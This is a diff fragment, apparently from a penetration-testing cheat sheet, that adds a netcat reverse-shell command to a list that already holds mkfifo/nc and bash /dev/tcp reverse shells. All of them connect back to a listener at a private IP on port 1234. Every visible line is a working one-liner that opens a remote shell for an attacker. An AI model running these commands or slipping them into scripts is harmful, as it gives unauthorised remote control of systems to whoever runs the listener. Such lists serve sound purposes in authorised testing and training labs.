@@ -127,6 +127,10 @@ rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.9.129.247 1234 
 /bin/bash -c '/bin/bash -i >& /dev/tcp/10.9.129.247/1234 0>&1'
 ```
 
+```sh
+nc -nv 10.11.55.28 1234 -e /bin/bash
+```
+
 ### Shell from SQL injection
 
 - Windows
